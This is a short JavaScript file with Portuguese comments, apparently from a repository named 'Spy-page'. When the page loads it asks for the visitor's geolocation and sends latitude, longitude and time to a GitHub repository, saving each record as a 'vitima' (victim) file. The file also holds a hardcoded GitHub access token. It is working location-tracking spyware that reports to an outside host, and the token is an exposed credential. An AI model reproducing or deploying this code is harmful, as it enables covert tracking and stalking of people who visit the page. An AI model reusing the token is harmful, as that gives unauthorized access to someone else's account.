// Função chamada assim que a página for carregada
window.onload = function() {
    // Verifica se o código está rodando no navegador
    if (typeof window !== "undefined" && navigator.geolocation) {
        // Tenta capturar a localização
        navigator.geolocation.getCurrentPosition(sendLocationToGitHub, showError);
    } else {
        // Se não estiver no navegador, enviar dados fictícios ou não fazer nada
        console.log("Geolocalização não disponível.");
    }
};

// Função para enviar a localização para o GitHub
function sendLocationToGitHub(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const time = new Date().toISOString(); // Hora no formato ISO

    // Criar o conteúdo que será enviado
    const content = JSON.stringify({
        latitude: lat,
        longitude: lon,
        time: time
    });

    const encodedContent = btoa(content); // Codifica o conteúdo em base64

    // Configuração da API do GitHub
    const token = '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'; // Coloque seu token de acesso pessoal aqui
    const repo = 'Spy-page'; // Nome do seu repositório GitHub
    const path = `data/vitima_${Date.now()}.json`; // Nome do arquivo
    const message = 'Adicionando dados de localização da vítima';

    // Requisição para criar/editar o arquivo no GitHub
    fetch(`https://api.github.com/repos/rlkkSky/${repo}/contents/${path}`, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
        },
        body: JSON.stringify({
            message: message,
            content: encodedContent
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.content) {
            console.log('Arquivo criado/atualizado no GitHub:', data);
        }
    })
    .catch(error => console.error('Erro ao enviar dados para o GitHub:', error));
}

// Exibe erro se não for possível obter a localização
function showError(error) {
    console.log("Erro ao obter localização:", error);

    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("Você negou a permissão para acessar sua localização.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Localização indisponível.");
            break;
        case error.TIMEOUT:
            console.log("Tempo de requisição expirado.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("Erro desconhecido.");
            break;
    }
}
